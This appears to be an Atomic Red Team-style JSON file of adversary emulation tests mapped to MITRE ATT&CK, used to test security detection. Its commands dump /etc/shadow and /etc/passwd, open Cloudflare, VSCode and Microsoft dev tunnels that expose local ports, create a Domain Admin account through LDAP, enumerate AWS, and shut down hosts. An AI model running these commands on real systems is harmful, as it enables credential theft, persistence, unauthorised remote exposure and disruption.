    "attack_technique": "T1614.001",
    "display_name": "System Location Discovery: System Language Discovery",
    "source_file": "T1614.001.yaml",
    "test_name": "Discover System Language with locale",
    "test_guid": "837d609b-845e-4519-90ce-edc3b4b0e138",
    "description": "Identify System language with the `locale` command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "locale\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n",
    "indexed_technique": "T1614.001.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1614.001",
    "display_name": "System Location Discovery: System Language Discovery",
    "source_file": "T1614.001.yaml",
    "test_name": "Discover System Language with localectl",
    "test_guid": "07ce871a-b3c3-44a3-97fa-a20118fdc7c9",
    "description": "Identify System language with the `localectl` command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "localectl status\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n",
    "indexed_technique": "T1614.001.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1614.001",
    "display_name": "System Location Discovery: System Language Discovery",
    "source_file": "T1614.001.yaml",
    "test_name": "Discover System Language by locale file",
    "test_guid": "5d7057c9-2c8a-4026-91dd-13b5584daa69",
    "description": "Identify System language with the by reading the locale configuration file.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check the location of the locale configuration file.\n",
        "prereq_command": "[ -f /etc/locale.conf ] || [ -f /etc/default/locale ] && exit 0 || exit 1\n",
        "get_prereq_command": "echo \"Test only valid for systems that have locale file\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n",
    "indexed_technique": "T1614.001.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1614.001",
    "display_name": "System Location Discovery: System Language Discovery",
    "source_file": "T1614.001.yaml",
    "test_name": "Discover System Language by Environment Variable Query",
    "test_guid": "cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a",
    "description": "Identify System language by checking the environment variables.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "env | grep LANG\nprintenv LANG\nset | grep LANG\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if printenv command exists on the machine\n",
        "prereq_command": "[ -x \"$(command -v printenv)\" ] && exit 0 || exit 1\n",
        "get_prereq_command": "echo \"printenv command does not exist\"\nexit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n",
    "indexed_technique": "T1614.001.04",
    "technique_index": 4,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1069.002",
    "display_name": "Permission Groups Discovery: Domain Groups",
    "source_file": "T1069.002.yaml",
    "test_name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS",
    "test_guid": "d58d749c-4450-4975-a9e9-8b1d562755c2",
    "description": "This test uses ldapsearch to query group information from Active Directory at ldap://example.com:389 with user@example.com and password s3CurePssw0rD!.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "The domain to be tested",
        "type": "string",
        "default": "example"
      },
      "top_level_domain": {
        "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
        "type": "string",
        "default": "com"
      },
      "user": {
        "description": "username@domain of a user",
        "type": "string",
        "default": "user@example.com"
      },
      "password": {
        "description": "password of the user referenced inside user",
        "type": "string",
        "default": "s3CurePssw0rD!"
      }
    },
    "dependencies": [
      {
        "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
        "prereq_command": "which ldapsearch\n",
        "get_prereq_command": "echo missing ldapsearch command; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
    "indexed_technique": "T1069.002.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1572",
    "display_name": "Protocol Tunneling",
    "source_file": "T1572.yaml",
    "test_name": "Microsoft Dev tunnels (Linux/macOS)",
    "test_guid": "9f94a112-1ce2-464d-a63b-83c1f465f801",
    "description": "This test creates a Microsoft dev tunnel to expose local port 8080 using the devtunnel binary at PathToAtomicsFolder/../ExternalPayloads/devtunnel.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "#{binary_path} host -p #{port} &\n",
      "cleanup_command": "pkill -9 $(basename \"#{binary_path}\")\n#{binary_path} user logout\nrm #{binary_path}\n",
      "name": "bash"
    },
    "input_arguments": {
      "port": {
        "description": "port number for tunnel",
        "type": "integer",
        "default": 8080
      },
      "download_url": {
        "description": "link to download devtunnel",
        "type": "string",
        "default": "https://aka.ms/TunnelsCliDownload/linux-x64"
      },
      "binary_path": {
        "description": "path to download devtunnel",
        "type": "string",
        "default": "PathToAtomicsFolder/../ExternalPayloads/devtunnel"
      }
    },
    "dependencies": [
      {
        "description": "Download devtunnel\n",
        "prereq_command": "test -f #{binary_path}\n",
        "get_prereq_command": "mkdir -p $(dirname #{binary_path})\ncurl -L \"#{download_url}\" -o \"#{binary_path}\"\nchmod +x #{binary_path}\n"
      },
      {
        "description": "Login to Microsoft Dev tunnels\n",
        "prereq_command": "#{binary_path} user show | grep -q \"Not logged in\" && exit 1 || exit 0\n",
        "get_prereq_command": "echo \"Login to devtunnel using the following command: #{binary_path} user login\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Dev Tunnels enables insiders as well as threat actors to expose local ports over the internet via Microsoft dev tunnels.\n\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.\nReference:\n- [Microsoft Docs](https://learn.microsoft.com/en-us/tunnels/dev-tunnels-overview)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/devtunnels/)\n",
    "indexed_technique": "T1572.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1572",
    "display_name": "Protocol Tunneling",
    "source_file": "T1572.yaml",
    "test_name": "VSCode tunnels (Linux/macOS)",
    "test_guid": "b877943f-0377-44f4-8477-f79db7f07c4d",
    "description": "This test uses the `code tunnel` command-line interface to create a secure tunnel for remote access to the local machine.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &\n",
      "cleanup_command": "pkill -9 tunnel\ncode tunnel unregister\ncode tunnel user logout\n",
      "name": "sh"
    },
    "input_arguments": {
      "artifact_base_url": {
        "description": "Base URL to download code-cli",
        "type": "string",
        "default": "https://code.visualstudio.com/sha/download"
      },
      "artifact_build": {
        "description": "build to download - Allowed values (stable/insiders)",
        "type": "string",
        "default": "stable"
      },
      "payload_path": {
        "description": "path to download code-cli",
        "type": "string",
        "default": "PathToAtomicsFolder/../ExternalPayloads"
      },
      "additional_args": {
        "description": "additional arguments to pass to code tunnel",
        "type": "string",
        "default": ""
      }
    },
    "dependencies": [
      {
        "description": "Install code-cli\n",
        "prereq_command": "which code\n",
        "get_prereq_command": "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\" && echo \"arm64\" || echo \"x64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen brew install code-cli\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen mkdir -p $(dirname #{payload_path})        \n  PKG_TYPE=$(command -v apt >/dev/null && echo \"deb\" || echo \"rpm\")\n  curl -L \"#{artifact_base_url}?build=#{artifact_build}&os=linux-${PKG_TYPE}-${ARCH_SUFFIX}\" -o \"#{payload_path}/code.${PKG_TYPE}\"\n  (which apt && apt install -y \"#{payload_path}/code.${PKG_TYPE}\") || (which yum && yum install -y \"#{payload_path}/code.${PKG_TYPE}\")\n  rm \"#{payload_path}/code.${PKG_TYPE}\"\nfi\n"
      },
      {
        "description": "Login to VSCode Dev tunnels\n",
        "prereq_command": "code tunnel user show | grep -q \"not logged in\" && exit 1 || exit 0\n",
        "get_prereq_command": "echo \"Login to code tunnel using the following command: code tunnel user login\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Visual Studio Code Remote Tunnels can be used for exposing local development environment/services/files over the internet.\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Microsoft Docs](https://code.visualstudio.com/docs/remote/tunnels)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/vscode-server/)\n",
    "indexed_technique": "T1572.02",
    "technique_index": 2,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1572",
    "display_name": "Protocol Tunneling",
    "source_file": "T1572.yaml",
    "test_name": "Cloudflare tunnels (Linux/macOS)",
    "test_guid": "228c336a-2f79-4043-8aef-bfa453a611d5",
    "description": "This test creates a Cloudflare tunnel to expose localhost:8080 using the cloudflared binary at PathToAtomicsFolder/../ExternalPayloads/cloudflared.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &\n",
      "cleanup_command": "pkill -9 $(basename \"#{binary_path}\")\nrm -f \"#{binary_path}\"\n",
      "name": "sh"
    },
    "input_arguments": {
      "cloudflared_artifact_base_url": {
        "description": "Base URL to download cloudflared",
        "type": "string",
        "default": "https://github.com/cloudflare/cloudflared/releases/latest/download"
      },
      "binary_path": {
        "description": "path to download cloudflared",
        "type": "string",
        "default": "PathToAtomicsFolder/../ExternalPayloads/cloudflared"
      },
      "url_to_tunnel": {
        "description": "IP and port to expose",
        "type": "string",
        "default": "localhost:8080"
      },
      "additional_args": {
        "description": "Additional arguments to pass to cloudflared",
        "type": "string",
        "default": ""
      }
    },
    "dependencies": [
      {
        "description": "Download cloudflared\n",
        "prereq_command": "test -f \"#{binary_path}\" && exit 0 || exit 1\n",
        "get_prereq_command": "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\" && echo \"arm64\" || echo \"amd64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen curl -L \"#{cloudflared_artifact_base_url}/cloudflared-darwin-${ARCH_SUFFIX}.tgz\" -o \"$(dirname #{binary_path})/cloudflared-darwin-${ARCH_SUFFIX}.tgz\" \n  cd \"$(dirname #{binary_path})\"\n  tar -xzf \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\n  rm -f \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\n  chmod +x \"#{binary_path}\"\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen mkdir -p $(dirname #{binary_path})\n  curl -L \"#{cloudflared_artifact_base_url}/cloudflared-linux-${ARCH_SUFFIX}\" -o \"#{binary_path}\"\n  chmod +x \"#{binary_path}\"\nfi\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Cloudflared can be used for exposing local development environment/services/files over the internet.\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Cloudflared Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/cloudflared/)\n",
    "indexed_technique": "T1572.03",
    "technique_index": 3,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1016.001",
    "display_name": "System Network Configuration Discovery: Internet Connection Discovery",
    "source_file": "T1016.001.yaml",
    "test_name": "Check internet connection using ping freebsd, linux or macos",
    "test_guid": "be8f4019-d8b6-434c-a814-53123cdcc11e",
    "description": "Check internet connection using ping.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "ping -c 4 #{ping_target}\n"
    },
    "input_arguments": {
      "ping_target": {
        "description": "target of the ping",
        "type": "url",
        "default": "8.8.8.8"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Check internet connection using ping on Linux, MACOS. The default target of the ping is 8.8.8.8 (Google Public DNS).\n",
    "indexed_technique": "T1016.001.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1003.008",
    "display_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
    "source_file": "T1003.008.yaml",
    "test_name": "Access /etc/shadow (Local)",
    "test_guid": "3723ab77-c546-403c-8fb4-bb577033b235",
    "description": "Access /etc/shadow using cat command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.008.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "/etc/shadow file is accessed in Linux environments\n",
    "indexed_technique": "T1003.008.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.008",
    "display_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
    "source_file": "T1003.008.yaml",
    "test_name": "Access /etc/master.passwd (Local)",
    "test_guid": "5076874f-a8e6-4077-8ace-9e5ab54114a5",
    "description": "Access /etc/master.passwd using cat command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.008.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "/etc/master.passwd file is accessed in FreeBSD environments\n",
    "indexed_technique": "T1003.008.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.008",
    "display_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
    "source_file": "T1003.008.yaml",
    "test_name": "Access /etc/passwd (Local)",
    "test_guid": "60e860b6-8ae6-49db-ad07-5e73edd88f5d",
    "description": "Access /etc/passwd using cat command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.008.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "/etc/passwd file is accessed in FreeBSD and Linux environments\n",
    "indexed_technique": "T1003.008.03",
    "technique_index": 3,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.008",
    "display_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
    "source_file": "T1003.008.yaml",
    "test_name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",
    "test_guid": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a",
    "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.008.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
    "indexed_technique": "T1003.008.04",
    "technique_index": 4,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.008",
    "display_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
    "source_file": "T1003.008.yaml",
    "test_name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins",
    "test_guid": "f5aa6543-6cb2-4fae-b9c2-b96e14721713",
    "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.008.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
    "indexed_technique": "T1003.008.05",
    "technique_index": 5,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1580",
    "display_name": "Cloud Infrastructure Discovery",
    "source_file": "T1580.yaml",
    "test_name": "AWS - EC2 Enumeration from Cloud Instance",
    "test_guid": "99ee161b-dcb1-4276-8ecb-7cfdcb207820",
    "description": "This test uses Stratus Red Team in $PathToAtomicsFolder/T1580/src to run AWS API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from an EC2 instance role in us-west-2.",
    "supported_platforms": [
      "linux",
      "macos",
      "iaas:aws"
    ],
    "executor": {
      "command": "export AWS_REGION=#{aws_region}\ncd #{stratus_path}\necho \"Stratus: Start Warmup.\"\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\necho \"Stratus: Start Detonate.\"\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\n",
      "cleanup_command": "cd #{stratus_path}\necho \"Stratus: Start Cleanup.\"\n./stratus cleanup aws.discovery.ec2-enumerate-from-instance\necho \"Removing Stratus artifacts from local machine.\"\nrm -rf stratus*\n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "stratus_path": {
        "description": "Path of stratus binary",
        "type": "path",
        "default": "$PathToAtomicsFolder/T1580/src"
      },
      "aws_region": {
        "description": "AWS region to detonate",
        "type": "string",
        "default": "us-west-2"
      }
    },
    "dependencies": [
      {
        "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
        "prereq_command": "if test -f \"#{stratus_path}/stratus\"; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi \n"
      },
      {
        "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
        "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
        "get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
    "indexed_technique": "T1580.01",
    "technique_index": 1,
    "categories": []
  },
  {
    "attack_technique": "T1136.002",
    "display_name": "Create Account: Domain Account",
    "source_file": "T1136.002.yaml",
    "test_name": "Active Directory Create Admin Account",
    "test_guid": "562aa072-524e-459a-ba2b-91f1afccf5ab",
    "description": "Use Admin Credentials to Create A Domain Admin Account\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
      "cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "The domain to be tested",
        "type": "string",
        "default": "example"
      },
      "top_level_domain": {
        "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
        "type": "string",
        "default": "test"
      },
      "admin_user": {
        "description": "username@domain of a user with admin privileges",
        "type": "string",
        "default": "admin@example.test"
      },
      "admin_password": {
        "description": "password of the user with admin privileges referenced in admin_user",
        "type": "string",
        "default": "s3CurePssw0rD!"
      },
      "domain_controller": {
        "description": "Name of the domain_controller machine, defined in etc/hosts",
        "type": "string",
        "default": "adVM"
      }
    },
    "dependencies": [
      {
        "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
        "prereq_command": "which ldapadd && which ldapmodify\n",
        "get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Use Admin Credentials to Create A Domain Admin Account\n",
    "indexed_technique": "T1136.002.01",
    "technique_index": 1,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1136.002",
    "display_name": "Create Account: Domain Account",
    "source_file": "T1136.002.yaml",
    "test_name": "Active Directory Create User Account (Non-elevated)",
    "test_guid": "8c992cb3-a46e-4fd5-b005-b1bab185af31",
    "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "command": "echo \"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
      "cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "The domain to be tested",
        "type": "string",
        "default": "example"
      },
      "top_level_domain": {
        "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
        "type": "string",
        "default": "test"
      },
      "admin_user": {
        "description": "username@domain of a user with admin privileges",
        "type": "string",
        "default": "user@example.test"
      },
      "admin_password": {
        "description": "password of the user",
        "type": "string",
        "default": "s3CurePssw0rD!"
      },
      "domain_controller": {
        "description": "Name of the domain_controller machine, defined in etc/hosts",
        "type": "string",
        "default": "adVM"
      }
    },
    "dependencies": [
      {
        "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify\n",
        "prereq_command": "which ldapadd\nwhich ldapmodify\n",
        "get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
    "indexed_technique": "T1136.002.02",
    "technique_index": 2,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1564.001",
    "display_name": "Hide Artifacts: Hidden Files and Directories",
    "source_file": "T1564.001.yaml",
    "test_name": "Create a hidden file in a hidden directory",
    "test_guid": "61a782e5-9a19-40b5-8ba4-69a4b9f3d7be",
    "description": "Creates a hidden directory /var/tmp/.hidden-directory and a hidden file /var/tmp/.hidden-directory/.hidden-file with content 'T1564.001'.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n",
      "cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a hidden file inside a hidden directory\n",
    "indexed_technique": "T1564.001.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Restart System via `shutdown` - FreeBSD/macOS/Linux",
    "test_guid": "6326dbc4-444b-4c04-88f4-27e94d0327cb",
    "description": "This test restarts a FreeBSD/macOS/Linux system via `shutdown`.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "shutdown -r #{timeout}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "timeout": {
        "description": "Time to restart (can be minutes or specific time)",
        "type": "string",
        "default": "now"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a FreeBSD/macOS/Linux system.\n",
    "indexed_technique": "T1529.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Shutdown System via `shutdown` - FreeBSD/macOS/Linux",
    "test_guid": "4963a81e-a3ad-4f02-adda-812343b351de",
    "description": "This test shuts down a FreeBSD/macOS/Linux system using a halt.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "shutdown -h #{timeout}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "timeout": {
        "description": "Time to shutdown (can be minutes or specific time)",
        "type": "string",
        "default": "now"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test shuts down a FreeBSD/macOS/Linux system using a halt.\n",
    "indexed_technique": "T1529.02",
    "technique_index": 2,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Restart System via `reboot` - FreeBSD/macOS/Linux",
    "test_guid": "47d0b042-a918-40ab-8cf9-150ffe919027",
    "description": "This test restarts a FreeBSD/macOS/Linux system via `reboot`.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "reboot\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a FreeBSD/macOS/Linux system via `reboot`.\n",
